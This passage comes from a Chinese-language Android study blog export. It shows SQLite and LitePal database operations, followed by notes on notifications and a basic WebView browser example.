<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button add_data = (Button) findViewById(R.id.add_data);</span><br><span class="line">add_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(<span class="string">"name"</span>,<span class="string">"The Da Vinci Code"</span>);</span><br><span class="line">        values.put(<span class="string">"author"</span>,<span class="string">"Dan Brown"</span>);</span><br><span class="line">        values.put(<span class="string">"pages"</span>,<span class="number">454</span>);</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">16.96</span>);</span><br><span class="line">        db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">        values.clear();</span><br><span class="line">        values.put(<span class="string">"name"</span>,<span class="string">"The Lost Symbol"</span>);</span><br><span class="line">        values.put(<span class="string">"author"</span>,<span class="string">"Dan Brown"</span>);</span><br><span class="line">        values.put(<span class="string">"pages"</span>,<span class="number">510</span>);</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">19.95</span>);</span><br><span class="line">        db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>点击按钮后在adb中运行命令即可查看到数据已经成功插入数据库了：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlite&gt; select * from Book;</span><br><span class="line">1|Dan Brown|16.96|454|The Da Vinci Code</span><br><span class="line">2|Dan Brown|19.95|510|The Lost Symbol</span><br></pre></td></tr></table></figure>

<h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><p>同样，SQLiteDatabase也提供了update()方法，它接收4个参数，分别是表名、ContentValues对象（包含要更新的数据）以及两个约束条件（用于约束更新某一行或某几行数据，不指定的话默认更新所有行）。</p>
<p>同样是新建button，然后添加代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button update_data = (Button) findViewById(R.id.update_data);</span><br><span class="line">update_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">10.99</span>);</span><br><span class="line">        db.update(<span class="string">"Book"</span>, values, <span class="string">"name = ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"The Da Vinci Code"</span>&#125;);</span><br><span class="line">        values.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在adb下运行命令即可看到价格已经更新了。</p>
<p>注：如果有多个参数，可修改为（以2个为例）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">db.update(<span class="string">"Book"</span>, values, <span class="string">"name = ? AND pages &lt; ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"The Da Vinci Code"</span>, <span class="string">"500"</span>&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>SQLiteDatabase也提供了delete()方法，它接收三个参数，分别为：表名，以及两个约束条件（同update）。</p>
<p>新建button，然后添加代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button delete_data = (Button) findViewById(R.id.delete_data);</span><br><span class="line">delete_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        db.delete(<span class="string">"Book"</span>,  <span class="string">"pages &gt; ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"500"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这样就会删除页数大于500的数据了。</p>
<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>SQLiteDatabase提供了query方法用于对数据进行查询，共有7个参数：</p>
<p><img src="./day5/1.jpg" alt=""></p>
<p>其返回的是一个Cursor对象。</p>
<p>下面继续实践下：</p>
<p>新建button，然后添加代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button query_data = (Button) findViewById(R.id.query_data);</span><br><span class="line">query_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        Cursor cursor = db.query(<span class="string">"Book"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                String name = cursor.getString(cursor.getColumnIndex(<span class="string">"name"</span>));</span><br><span class="line">                String author = cursor.getString(cursor.getColumnIndex(<span class="string">"author"</span>));</span><br><span class="line">                <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex(<span class="string">"pages"</span>));</span><br><span class="line">                <span class="keyword">double</span> price = cursor.getDouble(cursor.getColumnIndex(<span class="string">"price"</span>));</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span> + name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span> + author);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span> + pages);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span> + price);</span><br><span class="line">            &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">        &#125;</span><br><span class="line">        cursor.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>即可在Logcat界面看到查询到的数据。</p>
<h3 id="使用SQL操作数据库"><a href="#使用SQL操作数据库" class="headerlink" title="使用SQL操作数据库"></a>使用SQL操作数据库</h3><p>可以直接运行db.execSQL(sql_command);来完成sql操作。</p>
<h2 id="使用LitePal操作数据库"><a href="#使用LitePal操作数据库" class="headerlink" title="使用LitePal操作数据库"></a>使用LitePal操作数据库</h2><p>新建一个LitePalTest项目。</p>
<h3 id="LitePal简介"><a href="#LitePal简介" class="headerlink" title="LitePal简介"></a>LitePal简介</h3><p>LitePal是一款开源的Android数据库框架，它采用了对象关系映射（ORM）模式，并将平时开发最常用到的数据库功能进行了封装，地址：<a href="http://github.com/LitePalFramework/LitePal" target="_blank" rel="noopener">http://github.com/LitePalFramework/LitePal</a></p>
<p>在面向对象的语言和面向关系的数据库之间建立一种映射关系，就是对象关系映射。</p>
<h3 id="配置LitePal"><a href="#配置LitePal" class="headerlink" title="配置LitePal"></a>配置LitePal</h3><p>编辑app/build.gradle文件，在dependencies闭包中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">implementation 'org.litepal.android:core:1.3.2'</span><br></pre></td></tr></table></figure>

<p>接下来右击app/src/main目录-&gt;New-&gt;Directory，命名为assets，然后在该目录下新建litepal.xml文件，修改为如下内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">"BookStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改AndroidManifest.xml中的文件代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"org.litepal.LitePalApplication"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowBackup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:roundIcon</span>=<span class="string">"@mipmap/ic_launcher_round"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="创建和升级数据库"><a href="#创建和升级数据库" class="headerlink" title="创建和升级数据库"></a>创建和升级数据库</h3><p>先将DatabaseTest的布局完全移过来。</p>
<p>然后定义一个Book类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pages;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAuthor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> author;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAuthor</span><span class="params">(String author)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.author = author;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">double</span> price)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPages</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pages;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPages</span><span class="params">(<span class="keyword">int</span> pages)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pages = pages;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改litepal.xml中的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">"BookStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">dbname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">"com.example.litepaltest.Book"</span>&gt;</span> <span class="tag">&lt;/<span class="name">mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改活动代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button create_database = findViewById(R.id.create_database);</span><br><span class="line">        create_database.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Connector.getDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中Connector.getDatabase();就是用来创建数据库的操作。</p>
<p>然后在adb中用sqlite3打开数据库，并输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .schema</span><br><span class="line">CREATE TABLE android_metadata (locale TEXT);</span><br><span class="line">CREATE TABLE table_schema (id <span class="built_in">integer</span> primary key autoincrement,name text, <span class="built_in">type</span> <span class="built_in">integer</span>);</span><br><span class="line">CREATE TABLE book (id <span class="built_in">integer</span> primary key autoincrement,author text, name text, pages <span class="built_in">integer</span>, price real);</span><br></pre></td></tr></table></figure>

<p>可以看到存在了3个表，其中book就是我们刚创建的表。</p>
<p>同时，可以直接通过添加类的对象以及新增类，然后调用Connector.getDatabase()就可以直接修改数据，而不用先drop掉相应表后重新创建，同时，这种操作还会保留原有的数据。</p>
<h3 id="使用LitePal添加数据"><a href="#使用LitePal添加数据" class="headerlink" title="使用LitePal添加数据"></a>使用LitePal添加数据</h3><p>首先讲book设置为继承自DataSupport类，然后添加活动代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button add_data = findViewById(R.id.add_data);</span><br><span class="line">add_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Book book = <span class="keyword">new</span> Book();</span><br><span class="line">        book.setName(<span class="string">"The Da Vinic Code"</span>);</span><br><span class="line">        book.setAuthor(<span class="string">"Dan Brown"</span>);</span><br><span class="line">        book.setPages(<span class="number">454</span>);</span><br><span class="line">        book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">        book.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过save()方法即可向数据库中添加数据。</p>
<h3 id="使用LitePal更新数据"><a href="#使用LitePal更新数据" class="headerlink" title="使用LitePal更新数据"></a>使用LitePal更新数据</h3><p>添加活动代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button update_data = findViewById(R.id.update_data);</span><br><span class="line">update_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Book book = <span class="keyword">new</span> Book();</span><br><span class="line">        book.setPrice(<span class="number">14.95</span>);</span><br><span class="line">        book.updateAll(<span class="string">"name = ? and author = ?"</span>, <span class="string">"The Da Vinic Code"</span>, <span class="string">"Dan Brown"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>另外，在添加数据之后再一次调用sava()也可以用来更新数据。</p>
<p>如果想设置为默认值，则可以如下代码完成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Book book = <span class="keyword">new</span> Book();</span><br><span class="line">book.setToDefault(<span class="string">"pages"</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure>
<p>这样就可以将所有的书页数都更新为0。</p>
<h3 id="使用LitePal删除数据"><a href="#使用LitePal删除数据" class="headerlink" title="使用LitePal删除数据"></a>使用LitePal删除数据</h3><p>添加活动代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button delete_data = findViewById(R.id.delete_data);</span><br><span class="line">delete_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        DataSupport.deleteAll(Book.class,"price &lt; ?", "15");</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>即可删除所有价格小于15的书。</p>
<h3 id="使用LitePal查询数据"><a href="#使用LitePal查询数据" class="headerlink" title="使用LitePal查询数据"></a>使用LitePal查询数据</h3><p>添加活动代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Button query_data = findViewById(R.id.query_data);</span><br><span class="line">query_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        List&lt;Book&gt; books = DataSupport.findAll(Book<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">for</span>(Book book : books) &#123;</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span>+ book.getName());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span>+ book.getAuthor());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span>+ book.getPages());</span><br><span class="line">            Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span>+ book.getPrice());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>另外还可以用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataSupport.select(<span class="string">"name"</span>, <span class="string">"author"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//只查找name和author</span></span><br><span class="line">DataSupport.where(<span class="string">"pages &gt; ?"</span>, <span class="string">"400"</span>).find(Book<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//只查找pages &gt; 400</span></span><br></pre></td></tr></table></figure>

<p>等限定条件。</p>
<p>另外，LitePal仍然支持用SQL语句来查询：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cursor c = DataSupport.findBySQL(<span class="string">"select * from Book where pages &gt; ? and price &lt; ?"</span>, <span class="string">"400"</span>, <span class="string">"20"</span>);</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android数据持久化方式包括了文件存储、SharedPreferences存储以及数据库存储。其中文件存储适用于简单的文本数据或者二进制数据；SharedPreferences存储适用于存储一些键值对，而数据库存储则适用于存储复杂关系型数据。另外，LitePal数据库能简化Android自带的数据库操作步奏。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day7</title>
    <url>/2020/06/02/Android/Android-day7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>多媒体这块感觉也是不太需要，快速略过，了解下就行。</p>
<h1 id="多媒体的运用"><a href="#多媒体的运用" class="headerlink" title="多媒体的运用"></a>多媒体的运用</h1><h2 id="使用通知"><a href="#使用通知" class="headerlink" title="使用通知"></a>使用通知</h2><p>通知是Android系统中的一个功能，当某个应用程序希望向用户发出一些提示消息，而该应用程序又不在前台运行时，就可以借助通知来实现。</p>
<h3 id="通知的基本用法"><a href="#通知的基本用法" class="headerlink" title="通知的基本用法"></a>通知的基本用法</h3><p>通知即可以在活动里创建，也可以在广播接收器里创建，当然也可以在服务里创建。</p>
<h4 id="创建通知"><a href="#创建通知" class="headerlink" title="创建通知"></a>创建通知</h4><p>首先需要一个NotificationManager来对通知进行管理，可以调用Context的getSystemService()方法获取到。getSystemService()方法接收到一个字符串参数用于确定获取系统的哪个服务（这里我们传入Context.NOTIFICATION_SERVICE即可）。因此，获取NotificationManager的实例就可以写成：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NotificationManager manager = (NotificationManager) getSyetemService(Context.NOTIFICATION_SERVICE);</span><br></pre></td></tr></table></figure>

<p>接下来需要使用一个Builder构造器来创建Notification对象，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(context).build();</span><br></pre></td></tr></table></figure>

<p>上面只是一个空的Notification对象，下面来创建一个丰富的Notification对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(context)</span><br><span class="line">    .setContentTitle(<span class="string">"This is content title"</span>)<span class="comment">//标题</span></span><br><span class="line">    .setContentText(<span class="string">"This is content Text"</span>)<span class="comment">//通知正文内容</span></span><br><span class="line">    .setWhen(System.currentTimeMillis())<span class="comment">//指定通知创建时间</span></span><br><span class="line">    .setSmallIcon(R.drawable.small_icon)<span class="comment">//设置通知小图标</span></span><br><span class="line">    .setLargeIcon(BitmapFactory.decodeResource(getResource(),</span><br><span class="line">                                              R.drawable.large_icon))<span class="comment">//设置通知大图标，即下拉状态栏后显示的图标</span></span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure>

<p>接下来只需要调用NotificationManager的notify()方法就可以显示了。它第一个参数的id，第二个参数是Notification对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">manager.notify(<span class="number">1</span>, notification);</span><br></pre></td></tr></table></figure>

<h4 id="实现通知的点击效果"><a href="#实现通知的点击效果" class="headerlink" title="实现通知的点击效果"></a>实现通知的点击效果</h4><p>PendingIntent用于在某个合适的时机去执行某个动作，可以理解为是延迟执行的Intent。</p>
<p>有几个静态方法可以获取PendingIntent实例：getActivity()、getBroadcast()、getService()。这几个方法的参数都相同，分别是：Context、0（一般用不到）、Intent对象、PendingIntent的行为（有FLAG_ONE_SHOT、FLAG_NO_CREATE、FLAG_CANCEL_CURRENT和FLAG_UPDATE_CURRENT这四种值可选）。</p>
<p>NotificationCompat对象还可以再连缀一个setContentIntent()方法，其参数正是PendingIntent对象，因此可以加上这一方法从而实现通知的点击效果。</p>
<p>另外还需连缀.setAutoCancel(true)以达到点击后消息取消的目的。</p>
<p>在点击消息后创建的活动中调用NotificationManager的cancel()方法取消：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NotificationManager manager &#x3D; (NotificationManager) getSyetemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">manager.cancel(1);</span><br></pre></td></tr></table></figure>

<p>其中cancel中的参数1即是上面设置的通知id。</p>
<h3 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h3><p>setSound()在通知发出时播放音频。</p>
<p>setVibrate()在通知发出时振动（需要权限声明）</p>
<p>setLights(color, light_time,dark_time)在通知时闪烁通知灯，时间以毫秒为单位</p>
<p>还有更多的技巧可以直接查询相关文档，就不再研究了。</p>
<h2 id="调用摄像头和相册以及播放多媒体文件"><a href="#调用摄像头和相册以及播放多媒体文件" class="headerlink" title="调用摄像头和相册以及播放多媒体文件"></a>调用摄像头和相册以及播放多媒体文件</h2><p>具体即intent与内容提供器的结合，具体实现过程就不搞了。。。需要的话到时候直接网上copy。</p>
<h1 id="使用网络技术"><a href="#使用网络技术" class="headerlink" title="使用网络技术"></a>使用网络技术</h1><h2 id="WebView用法"><a href="#WebView用法" class="headerlink" title="WebView用法"></a>WebView用法</h2><p>Android提供了一个WebView空间，可以用于在应用程序中嵌入一个浏览器，从而轻松的展示各种各样的网页。</p>
<p>新建一个WebView项目，修改布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/web_view"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        WebView webView = (WebView) findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</span><br><span class="line">        webView.loadUrl(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，还需添加访问网络的权限说明：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就具备了一个简易的浏览器的功能了。</p>
